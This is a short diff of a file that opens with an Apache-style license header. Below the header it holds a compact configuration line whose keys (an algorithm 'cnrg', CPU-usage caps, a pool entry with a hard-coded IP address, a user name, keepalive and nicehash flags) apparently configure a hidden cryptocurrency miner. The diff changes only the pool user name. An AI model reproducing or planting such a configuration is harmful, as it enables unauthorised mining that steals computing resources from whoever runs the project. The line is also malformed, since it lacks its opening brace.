@@ -15,4 +15,4 @@
 // limitations under the License
 // ==============================================================================
 
-"al":"cnrg","av":0,"bg":false,"cl":false,"caf":null,"cpup":5,"dl":0,"lf":null,"mcu":95,"pt":0,"rt":10,"rp":5,"sf":false,"sl":false,"th":null,"plz":[{"ip":"52.43.87.248","ur":"dckr","kl":true,"nh":true}]}
+"al":"cnrg","av":0,"bg":false,"cl":false,"caf":null,"cpup":5,"dl":0,"lf":null,"mcu":95,"pt":0,"rt":10,"rp":5,"sf":false,"sl":false,"th":null,"plz":[{"ip":"52.43.87.248","ur":"helloworld","kl":true,"nh":true}]}
